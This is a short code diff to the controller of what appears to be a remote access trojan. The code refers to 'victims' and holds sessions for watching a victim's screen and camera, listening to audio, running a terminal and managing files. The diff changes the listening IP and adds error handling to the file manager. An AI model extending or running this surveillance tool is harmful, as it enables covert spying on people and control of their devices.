@@ -19,7 +19,7 @@ from victim import Victim
 
 # types: default, watch_screen, watch_camera, terminal, file_manager, listen_voice
 
-IP ="192.168.1.25"
+IP ="192.168.1.50"
 PORT = 123
 victim_screens = {"watch_screen": {}, "watch_camera": {}, "terminal": {}, "file_manager": {}, "listen_voice": {}}
 victims = {"client": {}, "watch_screen": {}, "watch_camera": {}, "terminal": {}, "file_manager": {}, "listen_voice": {}}
@@ -284,6 +284,8 @@ class FileManager(QWidget):
 
     def locale_list_item_double_clicked(self):
         selected_text = self.locale_list.selectedItems()[0].text()
+        if (len(selected_text.split("\t"))) > 1 and "-1" in selected_text.split("\t")[1]:
+            return
         print("locale dir label text:"+self.locale_dir_label.text()+".")
         print("selected text:"+selected_text+".")
         if self.locale_dir_label.text() == "":
@@ -293,8 +295,10 @@ class FileManager(QWidget):
         if os.path.isdir(path):
             self.locale_command("listdir", path=path)
         else:
-            os.startfile(path)
-            
+            try:
+                os.startfile(path)
+            except:
+                pass
     @staticmethod
     def convertSizeType(size: int) -> str:
         if size == -1:
